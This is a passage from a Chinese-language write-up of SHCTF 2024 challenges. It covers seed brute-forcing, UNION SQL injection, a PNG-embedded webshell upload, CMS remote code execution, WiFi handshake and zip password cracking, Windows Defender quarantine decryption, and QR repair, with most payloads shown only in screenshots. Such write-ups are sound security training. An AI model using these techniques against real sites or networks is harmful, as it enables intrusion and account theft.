random.seed(seed)</span><br><span class="line">    <span class="keyword">if</span> random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>) == <span class="number">3944680199</span>:</span><br><span class="line">        <span class="keyword">return</span> seed</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    seed_range = <span class="built_in">range</span>(<span class="number">1000000</span>, <span class="number">9999999</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> Pool(processes=multiprocessing.cpu_count()) <span class="keyword">as</span> pool:</span><br><span class="line"></span><br><span class="line">        results = pool.<span class="built_in">map</span>(test_seed, seed_range)</span><br><span class="line">        </span><br><span class="line">        valid_seeds = [seed <span class="keyword">for</span> seed <span class="keyword">in</span> results <span class="keyword">if</span> seed <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> valid_seeds:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到满足条件的seed值：<span class="subst">&#123;valid_seeds&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;没有找到满足条件的seed值。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到seed值：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728888830627-a2f7dbc0-a239-4338-92cb-ef1c9410b997.webp" alt="image.png"></p><p>再利用seed生成second_num:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">seed =<span class="number">7267054</span></span><br><span class="line"></span><br><span class="line">random.seed(seed)</span><br><span class="line"></span><br><span class="line">first_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line">second_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (second_num)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728889034367-d480aa5e-1455-491d-b30b-6606a880a736.webp" alt="image.png"></p><p>得到：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728889118062-aaa5600b-6858-43ba-acfb-1eccf778afcc.webp" alt="image.png"></p><h2 id="·-自助查询"><a href="#·-自助查询" class="headerlink" title="· 自助查询"></a>· 自助查询</h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1728889211878-d00967a2-9761-441e-a406-25d276b6cf03.webp" alt="image.png"></p><p>一眼sql注入，猜测是联合查询：<br>先验证一下：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728889382059-bbec38c6-7e8b-4163-a2bf-401f304a0088.webp" alt="image.png"></p><p>有注入，但flag藏得比较深，可能在别的表；<br>先找出整个的库：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728889522073-bc3ab7ff-02d8-4349-b092-5c92eaab934a.webp" alt="image.png"></p><p>得到库名为ctf；再找出这个库底下的所有表：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728889809798-d90089b6-4da1-469b-a289-df15eee6be0d.webp" alt="image.png"></p><p>得到两个表名，很明显我们的目标是flag库；<br>查询flag库下的所有列名：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728889973110-4e4e17d1-2cb2-4bf3-8712-e2a04a4cecc5.webp" alt="image.png"></p><p>得到一个名叫’scretdata’的列，查询scretdata下的信息：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728890148654-977a1448-a302-4690-abde-de047d3ed1ae.webp" alt="image.png"></p><p>很可惜，flag不在里面，不过出题人提示了我们flag在注释里面，那就是要查询注释<br>先从表注释开始吧：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728890366579-3bff1c2c-fb9f-45bc-a4b8-3528ec5f3b38.webp" alt="image.png"></p><p>没有结果，那就查字段注释：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728890420666-76f3e9a7-8c91-425a-bc64-1e3f56d0d228.webp" alt="image.png"></p><h2 id="·-拜师之旅·番外"><a href="#·-拜师之旅·番外" class="headerlink" title="· 拜师之旅·番外"></a>· 拜师之旅·番外</h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1729402772211-cdb13fd9-5931-410b-8f52-f8307fd5b84b.webp" alt="image.png"></p><p>很明显是个文件上传类型的题，先随便传个一句话马：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729402883842-70975e2f-c1eb-4747-8c42-58696d64d51c.webp" alt="image.png"></p><p>有验证，在图片里插个马再传：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729403121394-fbcea731-5c20-4f34-9f04-adc8c8ba25e6.webp" alt="image.png"></p><p><img src="/resources/images/SHCTF2024WriteUpassert/1729403158859-ef567597-10df-4319-93e3-9651d493d1f1.webp" alt="image.png"></p><p>还是不行，看来服务器端对上传的png文件数据做了校验<br>那思路就是做一个图片数据中包含木马的png文件，且其可以通过数据校验<br>网上已经有大佬的脚本可以生成这种文件<br><img src="/resources/images/SHCTF2024WriteUpassert/1729403804261-b3299f22-1473-47b7-99f6-e1484f7bf1f6.webp" alt="image.png"><br>-&gt;<img src="/resources/images/SHCTF2024WriteUpassert/1729403856566-408e3263-725a-4a7c-97f2-a118900db21f.webp" alt="PngTrojan.png"></p><p>上传：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729403981308-c1c8a4e2-c703-449f-bbd0-8d94f115c0dc.webp" alt="image.png"></p><p>上传成功，服务器端对其进行了重命名，点开查看：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729404060010-a2da46cf-4e64-41fc-af3f-3fee6fae6733.webp" alt="image.png"></p><p>发现路径为&#x2F;upload&#x2F;xxx.png<br>则构造payload:<br><img src="/resources/images/SHCTF2024WriteUpassert/1729404267554-51c01a1f-e05e-4e81-8f4a-205ff8eba2ce.webp" alt="屏幕截图 2024-10-16 182149.png"></p><p>得到flag</p><h2 id="·-小小cms"><a href="#·-小小cms" class="headerlink" title="· 小小cms"></a>· 小小cms</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/shelter1234567/article/details/138524342">链接</a><br>题目提示我们这个网站能被rce，根据以上文章构建请求包：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729404687954-e0b65b86-9663-4f3f-8c8b-22fa84dc7269.webp" alt="image.png"></p><p>得到flag</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="·-有WiFi干嘛不用呢？"><a href="#·-有WiFi干嘛不用呢？" class="headerlink" title="· 有WiFi干嘛不用呢？"></a>· 有WiFi干嘛不用呢？</h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1728396792717-d136b3de-6ea7-47d4-9cdf-f0d09e590f79.webp" alt="image.png"></p><p>csv与xml文件均无有效信息，发现.cap文件是握手包，且被加密：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728396831838-12e739e3-1a8e-4dc8-8bee-a1732393fd70.webp" alt="image.png"></p><p>推测may文件夹内文件的文件名或文件内容是密钥<br>利用以下代码读取并输出文件名与内容至txt文件中制作字典<br><img src="/resources/images/SHCTF2024WriteUpassert/1728396845526-d9d65f20-8bdb-4344-8902-687cc8964980.webp" alt="image.png"></p><p>使用aircrack-ng工具暴力破解cap包，得到密钥<br><img src="/resources/images/SHCTF2024WriteUpassert/1728396870331-4532f543-586f-4adc-a890-5f5c606939b9.webp" alt="image.png"></p><p>密钥即为Flag</p><h2 id="·-拜师之旅①"><a href="#·-拜师之旅①" class="headerlink" title="· 拜师之旅①"></a><strong>· 拜师之旅①</strong></h2><p>原始PNG文件无法打开,使用PCRT进行修复:<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397061082-0066ec87-7e70-4bd4-8946-bd892c990d30.webp" alt="image.png"></p><p>查看图片属性,发现分辨率为1520x1792<br>这种图高度一般不会是这种数字,判断高度被篡改<br>010改高度:<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397035364-2c68a087-d68b-4ffd-b319-33e5c11c3986.webp" alt="image.png"></p><p>得到<del>好图</del>Flag<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397050021-edd50fe7-1e6d-4943-8f39-93c4fd60ee3b.webp" alt="image.png"></p><h2 id="·-真真假假-遮遮掩掩"><a href="#·-真真假假-遮遮掩掩" class="headerlink" title="· 真真假假?遮遮掩掩!"></a>· 真真假假?遮遮掩掩!</h2><p>打开压缩包，发现被加密且为真加密<br>010查看，发现文件尾部有提示信息<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397081728-05782d94-13e2-4209-b0a3-7676c9f00ade.webp" alt="image.png"></p><p>结合题目与提示信息格式，使用ARCHPR掩码爆破文件密码<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397088974-fa96bee9-f88f-4144-9e7e-490692a5e02b.webp" alt="image.png"></p><p>得到Flag：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397107658-985137b3-acc4-4139-8d7b-38c4911b02c9.webp" alt="image.png"></p><h2 id="·-Rasterizing-Traffic"><a href="#·-Rasterizing-Traffic" class="headerlink" title="· Rasterizing Traffic"></a>· Rasterizing Traffic</h2><p>压缩包内是一个.pcapng文件，判断为抓到的数据包<br>010打开，发现png文件<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397126430-61534e56-a7e4-4eb1-ad32-161039ac8e2e.webp" alt="image.png"></p><p>掐头去尾，得到以下图片：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397131935-211b63b7-22d0-4128-a444-c7883c889154.webp" alt="image.png"></p><p>Png的文件名已经提示我们这是一个光栅图，判断为横向隐写，先二值化图片：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397140223-62b2b9ea-1850-44f2-a089-00a49f626e87.webp" alt="image.png"></p><p><em>让脚本好发挥一点</em></p><p>利用Raster-Terminator提取出如下图片：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397195801-667b1ea8-819a-46d1-aae0-ce5ced6bf164.webp" alt="image.png"></p><p>在5-1至5-5得到Flag</p><h2 id="·-Quarantine"><a href="#·-Quarantine" class="headerlink" title="· Quarantine"></a><strong>· Quarantine</strong></h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1728397230077-c9176b50-df09-447d-bed7-addc721222b3.webp" alt="image.png"></p><p>hint提示我们这是一个被Windows Defender隔离的文件<br>010打开看一眼，很明显是被加密过的：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397237748-b8b5ae47-6971-4c65-9e19-7dee9c62ce41.webp" alt="image.png"></p><p>既然被加密了那就要解密，通过万能的互联网我们检索到了两篇文章：<br>·[Reverse, Reveal, Recover: Windows Defender Quarantine Forensics – Fox-IT International blog](<a target="_blank" rel="noopener" href="https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=Recovering">https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=Recovering</a> files by investigating)<br>·[How to Extract Quarantine Files from Windows Defender | Nikola’s Blog (reversingfun.com)](<a target="_blank" rel="noopener" href="https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=C:\Windows\Temp\eicar.txt">https://www.yuque.com/rikoto/rr0r9n/ntosrpbuk1988usv#:~:text=C:\Windows\Temp\eicar.txt</a>. As you can)<br>总结一下提取到的信息：<br>·Windows Defender 隔离的文件本体采用RC4加密<br>·加密的密钥还是静态的，可以从第二篇Blog中获取<br>密钥：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397251659-68ca22a4-3a3c-465d-86f4-878238b22886.webp" alt="image.png"></p><p>因为py环境崩了，这里我们就不使用Blog中提供的脚本了，寻找在线工具解决：<br>先把文件转成Base64<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397260998-847606c5-527a-4c8a-9594-3b9a8da2674b.webp" alt="image.png"></p><p>再RC4解密：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397269793-02849314-2043-42ca-b0e8-945fd4d8a3e3.webp" alt="image.png"></p><p>可以看到本体是个一句话木马，后面跟了一串Base64编码的文件<br>把那串Base64编码的文件拉去解密：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397297898-88d39cf6-4798-46d9-90e5-1a6cbd8d017e.webp" alt="image.png"></p><p>看到PK头了，很明显是个zip压缩包，内含flag，转成Hex导入010再导出获得zip文件：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397304933-286a02d5-c022-4f55-ace7-0397a67476ce.webp" alt="image.png"></p><p>但是被加密了，回010查看为真加密，且没有其他提示<br>那就只能爆破了，先试下rockyou字典爆破，结果直接出来了：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728397311369-b66ec1a4-08a6-4144-afa4-651649dc36aa.webp" alt="image.png"></p><h2 id="·-遮遮掩掩？CCRC"><a href="#·-遮遮掩掩？CCRC" class="headerlink" title="· 遮遮掩掩？CCRC!"></a>· 遮遮掩掩？CCRC!</h2><p>读题，题目提示我们这道题是针对zip的CRC32碰撞攻击。<br>常规思路先走一遍，先查看压缩包内文件：</p><p>可以看到压缩包内有很多小体积的.txt文件，大小为3byte，文件大小在6byte以内，判断可以通过CRC碰撞获取文件内容。<br>利用碰撞脚本<a target="_blank" rel="noopener" href="https://github.com/AabyssZG/CRC32-Tools">这里</a>进行解密：<img src="/resources/images/SHCTF2024WriteUpassert/1728535048024-1591b818-d2d8-46f0-b4f8-cf30a1a02289.webp" alt="image.png"><br><img src="/resources/images/SHCTF2024WriteUpassert/1728535739967-7d94b90b-8321-4eb7-94d3-df2daad8da1d.webp" alt="image.png"></p><p>脚本报错，很明显此路不通，不是传统的CRC32碰撞解密<br>重新审题，发现关键点：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728535914374-1c88d1cb-84d5-424e-8afb-3e59b2383802.webp" alt="image.png"></p><p>资深冲浪选手肯定马上就能明白，这句话指向的是资源分享的圣堂：与熊论道<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/index.html">这里</a><br><img src="/resources/images/SHCTF2024WriteUpassert/1728536208802-f03976b8-fdf9-457e-8e1b-4f744c92236d.webp" alt="image.png"></p><p>这是一个可以对文本进行特殊编码&#x2F;解码的平台，一般编码后输出的内容开头会带有’熊曰‘字样，如：<img src="/resources/images/SHCTF2024WriteUpassert/1728536430183-8f64366f-183a-4817-b98e-df061efaa3f7.webp" alt="image.png"></p><p>题目提示到了，肯定有它的用处，而这里只有一个东西可以与其发生关联：zip内的文本文件。<br>也就是说，zip内的文本文件很可能存储了熊曰编码后的文本，而这个文本形式是中文。<br>验证一下：<br>因为熊曰加密的第一个字符必为“呋”，我们将其输入文本文件中，查看其CRC32值并比对：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728537980132-4ba9dc09-6acd-42e5-9056-20acc58cf451.webp" alt="image.png"></p><p>可以看到，CRC32相同，大小也同为3byte<br>那么CRC32碰撞不出结果的原因也出来了，原先脚本使用字库为所有可打印字符：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728537245917-943d5d83-a1b5-4a77-8f4e-79f84485edde.webp" alt="image.png"></p><p>输出一下，可以看见其中并不包含中文字符：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728537359383-c0e7fc4d-69bc-44a1-8806-f1db3b2b3412.webp" alt="image.png"></p><p>所以我们应该将chars改为熊曰论道所有可能出现的字符<br>万能的互联网找不到熊曰论道会用什么字符，那我们就自己搓：<br>随便整一大段字符放进去加密：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728538225327-be6734a4-f098-4cc5-874e-814b31e62d42.webp" alt="image.png"></p><p>文本去重<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/quchong/">这里</a>，得到：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728538460886-c9b51996-1302-4ee1-b71f-d0fade10a501.webp" alt="image.png"></p><p>chars改为上述字符即可：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728538717884-1a06df5d-6c1a-495b-9e70-d0bff17d4255.webp" alt="image.png"></p><p>同时注意，因为这样的中文一个字符即占3byte，所以我们更改1byte解密脚本的字库进行破解<br>运行：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728538802170-d360e791-d5bf-4cd3-8ca0-aeff8b35223c.webp" alt="image.png"></p><p>需要注意的是，因为解密顺序是名称顺序，所以各字符代表的是1，10，11……txt的内容<br>手动更改顺序即可：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728538967642-32490d7a-56b7-41da-9d70-4fcb56691836.webp" alt="image.png"></p><p>输入并解密：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728539020798-d25bcabd-749b-4357-b7c4-22c26f66bccc.webp" alt="image.png"><br><del><em>关注塔菲谢谢喵~</em></del></p><h2 id="·-拜师之旅②"><a href="#·-拜师之旅②" class="headerlink" title="· 拜师之旅②"></a>· 拜师之旅②</h2><p>下载附件，解压查看，<del>我们就得到了flag</del><br><img src="/resources/images/SHCTF2024WriteUpassert/1728539477163-1a493d13-85cb-450a-9478-b73527f8c22a.png" alt="secret.png"></p><p>老规矩，先看属性：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728539531384-bb5db906-2dc1-4339-92d7-73f33c316cf1.webp" alt="image.png"></p><p>分辨率很低，数字很怪，文件又这么大，第一思路肯定是改宽高<br>用010获取CRC：0x6FFE8F48<br>整个脚本用CRC32验证一下宽高先：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728540089900-27340deb-034c-405a-846e-4f81f7ca0a05.webp" alt="image.png"></p><p><img src="/resources/images/SHCTF2024WriteUpassert/1728539954377-faaf5c28-0652-4b30-966a-175ab5797fc6.webp" alt="image.png"></p><p>没有问题，那下一个思路就是图片里藏文件了：<br>010打开文件，发现有一个IDAT块没有填满：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728540216855-dbe67de0-d27d-4513-be14-94b165f4f3f0.webp" alt="image.png"></p><p>那就是藏了一张png了，把这一个及这之前的所有IDAT块删掉，保留文件头及IHDR，导出得到图片：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728639511974-d47d42b3-f9b0-4793-a5be-cd075fe27409.webp" alt="secret3.png"></p><p>得到真flag</p><h2 id="·-练假成真"><a href="#·-练假成真" class="headerlink" title="· 练假成真"></a>· 练假成真</h2><p>题目附件是一张被部分遮挡的二维码图片<br><img src="/resources/images/SHCTF2024WriteUpassert/1728730951694-6ba01cac-a363-45a6-8aab-fc59cce86a8b.webp" alt="download.png"></p><p>因为是png，我们先按照png的思路来走一遍：<br>010打开，发现文件尾部藏了一个png，掐头导出：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728739822489-a04b2741-505b-4baa-9a1c-e8cae2b1fff1.webp" alt="output.png"></p><p>是另一个二维码，扫描可以得到以下文本：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728739890002-aaa7732f-952d-4f51-b736-f3e93f2a631c.webp" alt="image.png"></p><p>看起来似乎有某种规律，分析一下：<br>· 有很多连续的字符<br>· 绝大多数字符都只出现过一次<br>· 似乎是某些字符被调换了顺序<br>· 排列顺序基本是大写字母-&gt;小写字母-&gt;数字-&gt;特殊符号<br>据此我们可以写出这样的字符串：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728740275872-20527d02-2c0e-43d9-9bab-c164a7c886cc.webp" alt="image.png"></p><p>接着得到字符之间的对应替换关系：</p><p><code>V-&gt;N</code> <code>N-&gt;R</code> <code>R-&gt;V</code><br><code>F-&gt;h</code> <code>h-&gt;p</code> <code>p-&gt;F</code><br><code>h-&gt;y</code> <code>y-&gt;H</code><br><code>0-&gt;G-&gt;0</code> <code>2-&gt;1-&gt;2</code><br><code>9-&gt;Y-&gt;9</code> <code>c-&gt;Z-&gt;c</code><br><code>z-&gt;T-&gt;z</code> <code>j-&gt;E-&gt;j</code><br><code>S-&gt;M-&gt;S</code></p><p>不过即便我们归纳出了字符之间的关系，也无法得到任何有用的信息。<br>思路中断，就应该搁置一边，回去审题，看有没有其他的信息和突破口：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728740907702-9b672b7b-d268-4c2e-8380-a820e9b6e0eb.webp" alt="image.png"></p><p>很明显没有什么用处，所以我们将目光转向那张损坏的二维码：<br>前置知识：二维码的构成与阅读法<br>二维码是存在着纠错机制的，所以即便某些信息缺失，我们也可以通过二维码的纠错码来恢复部分信息。<br>纠错码的区域一般靠近二维码的左侧，所以这张二维码的遮挡主要是损坏了数据。<br>先了解一下二维码的纠错特性：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728741504656-e083a9ef-46f7-45f2-a263-06577c17f395.webp" alt="cade0a55e21e0ba78dee1428d5615d3.jpg"></p><p>通过二维码工具QRazyBox<a target="_blank" rel="noopener" href="https://merri.cx/qrazybox/">网页Demo</a>，可以获取到纠错等级为M,版本为3：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728741968912-052ef6f9-2393-47ea-ab42-a268baf45e0a.webp" alt="image.png"></p><p>这意味着我们可以在版本3，M纠错等级的二维码最多可存储的44字节数据中自动恢复13字节数据。<br><img src="/resources/images/SHCTF2024WriteUpassert/1728742621601-ba8b30a4-ef17-473a-96db-edc6395980ca.webp" alt="2a8d3a064cb6c253522daed5c5d4875.jpg"></p><p><em>划分了一下字节区域，数据有些错误，仅看分区</em><br>这怎么看都不像是只丢失了13字节的样子<br>但是QR码的纠错使用了reed-solomon纠错码，只要我们知道二维码的数据损坏的位置，就可以大幅提升数据恢复的能力，最高可以提升到26字节<br>所以我们的思路就确定了：读取二维码剩余的所有数据，确定损坏字节数，并尽可能人工修复一部分，然后利用纠错码恢复剩余数据<br>先利用之前那个网站填充补齐码，去除掩码：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728743319629-34b86fad-23b7-4aa7-95cf-2b18badd3feb.webp" alt="屏幕截图 2024-10-12 222557.png"></p><p>掩码样式在上面可以获取到，为3，至于补齐码，是用来填充用不到的字节的，不存储数据<br>接下来就可以手动提取二维码信息了：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728743535984-c28c4dce-5bc3-4f3a-a0ce-54d9c083bd2c.webp" alt="image.png"></p><p>从右下角第1，2字节处可以获取到这张二维码的编码类型为字节类型(0100),存储了(00011111)&#x3D;31字节数据<br>而这31字节数据中，我们有4字节完整的数据，额外附赠几比特散装数据<br>这个时候我们缺失27字节数据，因为纠错码也有些丢失，我们需要多找出一些数据<br>现在就要从存储的内容下手了，阅读二维码，得到以下信息：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728744309182-47ff3b7a-6906-4935-8351-fb8f32921109.webp" alt="image.png"></p><p>尝试解码一下未损坏的数据：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728744586641-b36f27d4-d1ea-45cc-a495-c10c3d07925f.webp" alt="image.png"><br><img src="/resources/images/SHCTF2024WriteUpassert/1728744591697-43877e91-c390-42cf-b483-ee196effc37f.webp" alt="image.png"></p><p>有没有想起什么？很明显是flag。<br>这个平台的flag格式是什么？SHCTF{}。<br>这个时候我们就可以假定数据的头部为SHCTF{，这样我们又白嫖了6个字节的数据，这样添加：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728745190595-71355348-4887-4832-9c66-dc48a2ffdbb2.webp" alt="image.png"><br><img src="/resources/images/SHCTF2024WriteUpassert/1728745222638-0237d6f1-661d-4f04-9e8b-52d6144e68a6.webp" alt="image.png"><br><em>01头也可以对的上**​</em><br>现在还缺失21字节的数据，理论上可以恢复数据了：<br>使用python的reedsolo库进行修复，直接使用的其他人的脚本，改了一下错误：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728745096823-0da0dc22-bbe7-4405-9418-9723439545d3.webp" alt="image.png"><br><img src="/resources/images/SHCTF2024WriteUpassert/1728745345131-c21c5d9a-53a2-4781-9668-a640a059ccf4.webp" alt="image.png"></p><p>把数据部分提取出来解密，得到：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728745493123-b17fce35-85de-463b-9406-667a543b9eb1.webp" alt="image.png"></p><p><em>最后4位0000不要提取，是补位用的</em><br>flag？提交一下就知道是一个fake flag了。<br>里面的字符串看起来有点像Base64编码过的，解码一下，得到：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728745692716-f1a434fc-a179-4b43-b805-73d50f83a6e0.webp" alt="image.png"></p><p>flag？它都告诉你它是一个fake flag了。<br>这个时候读一下题，再看一下上面的Base64，是不是会感觉到有点熟悉？<br>我们拿之前总结出的字符对应关系对照一下，可以发现全都有对应关系。<br>转换一下，再拿Base64解码一下：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728745993007-17b9eeda-7de0-48ab-bc0e-37604cfeb56c.webp" alt="image.png"></p><p>flag？没错它就是flag。</p><h2 id="·-Schneider"><a href="#·-Schneider" class="headerlink" title="· Schneider"></a>· Schneider</h2><p><img src="/resources/images/SHCTF2024WriteUpassert/1728813327784-18235040-075a-4ff5-90e6-4e5a91226c4d.webp" alt="image.png"></p><p>如题，使用Schneider EcoStruxure Operator Terminal Expert打开：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728813386174-18f4da33-aada-4bfe-9b8a-2ed3b43d5c81.webp" alt="image.png"></p><p>点击Show Password即可得到flag：<br><img src="/resources/images/SHCTF2024WriteUpassert/1728813427966-fa2ee709-b923-45b7-bdb0-541354c65dc5.webp" alt="image.png"></p><h2 id="·-拜师之旅③"><a href="#·-拜师之旅③" class="headerlink" title="· 拜师之旅③"></a>· 拜师之旅③</h2><p>下载后得到一张萝卜子png：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729404883242-0602247e-3ffd-4d09-9bda-ba1a7b9f4f3e.webp" alt="1.png"></p><p>010打开查看，png尾部藏了一个zip文件，掐头提取得到压缩包，但是被加密了<br>使用stegsolve查看，发现原图存在lsb隐写：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729405165070-7365c93e-fc3c-4675-a558-e3157ec82533.webp" alt="image.png"></p><p>得到zip密码，解压后得到了另一张萝卜子png：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729405243541-cc1914b4-bdab-4ac1-9dc7-cfab3d3014aa.webp" alt="0107d803-db2e-4996-a7c7-95acbcdfb54d.png"></p><p>放大查看，有奇怪的小点点<br>同时010打开，得知图片真实尺寸为320*180<br><img src="/resources/images/SHCTF2024WriteUpassert/1729405341768-9d7a00df-12f3-44e7-9163-f7e65ebca703.webp" alt="image.png"></p><p>那思路就是将小点点像素提取出来<br>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cierra/p/17357133.html">链接</a><br>利用里面的脚本提取，得到flag:<br><img src="/resources/images/SHCTF2024WriteUpassert/1729405780591-431347b3-832e-47d7-aff8-53da65e32dfd.webp" alt="atri.png"></p><h2 id="·-今日无事，勾栏听曲"><a href="#·-今日无事，勾栏听曲" class="headerlink" title="· 今日无事，勾栏听曲"></a>· 今日无事，勾栏听曲</h2><p>题目附件无后缀名，用010打开：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729940352613-b279dab6-87df-4ea8-a594-8c071137fa13.webp" alt="image.png"></p><p>分析文件内容，没有明显的文件头<br>浏览文件，可以发现有大量重复的数据，可以分为两类：</p><ol><li><code>00 00 04 08</code></li></ol><p>开头的数据<br>2. <code>00 00 01 10</code><br>开头的数据整个文件其实就只有这两段数据重复出现，推测是用其表示了二进制的<code>0</code><br>和<code>1</code></p><p>使用010的文本替换功能将<code>00 00 04 08</code><br>替换成<code>0</code>，<code>00 00 01 10</code>替换成<code>1</code></p><p>得到：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729940968047-71d82086-9877-4199-b24f-ba0b458f5816.webp" alt="image.png"></p><p><em>数据很大</em></p><p>转换为16进制，得到文件：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729941080454-ade15095-ca32-43ed-948d-976e545963cf.webp" alt="image.png"></p><p>是个rar文件，内含flag.txt与draw.txt<br>flag.txt是以明文存储的，很明显是fake flag<br>关键在于draw.txt，但是winrar打开提示损坏：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729941295715-1e9847f3-7175-475f-ba7a-0fda148c6448.webp" alt="image.png"></p><p>提示文件头损坏，检查文件头，发现：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729941352329-77e47699-9448-4162-893e-3abcd93ea940.webp" alt="image.png"></p><p><code>7A</code>处错误，正常应该是<code>74</code>表示文件头，更改后打开得到draw.txt：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729941521994-4016a26e-1dde-4c65-ba10-dc2a11c00dde.webp" alt="image.png"></p><p>每行长度相同，为1024，且有少数字符变化，猜测是点阵图：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729941630567-6a29e428-82af-4686-8f8d-afb26fa219e1.webp" alt="image.png"></p><p>可以看到是一个塔，尖顶，带铁链，底下是一个带栏杆的平台,中间有拱状缺口……<br>搜索得到大雁塔，符合特征：<br><img src="/resources/images/SHCTF2024WriteUpassert/1729941726096-6abed2ab-06d6-401a-81e6-c3e1f158a546.webp" alt="100w15000000xgcys4600.jpg"></p><p>转换md5，得到flag<br><img src="/resources/images/SHCTF2024WriteUpassert/1729941810926-3fcca59e-f32b-4274-9b30-5a6ac22d57be.webp" alt="image.png"></p><h2 id="·-天命人"><a href="#·-天命人" class="headerlink" title="· 天命人"></a>· 